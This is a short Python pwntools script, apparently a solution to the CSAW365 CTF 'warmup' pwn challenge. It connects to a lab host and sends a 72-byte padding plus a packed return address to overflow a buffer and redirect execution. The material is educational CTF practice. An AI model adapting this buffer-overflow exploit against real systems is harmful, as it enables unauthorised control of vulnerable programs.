#!/usr/bin/python
# Created for the CSAW365 CTF pwn challenge "warmup" 
# Very basic example of using pwntools to establish a remote connection
# and send and receive some data

from pwn import *
import struct

s = remote("10.67.0.1",31419)

# 72-byte offset + the address shown by the "WOW" output
# binary is 64-bit, so pack with Q rather than <I

buffer = "A" * 72
rip = struct.pack("Q",0x4005f6)

print s.recv(4096)
print s.sendline(buffer + rip)
print s.recv(4096)

s.close()
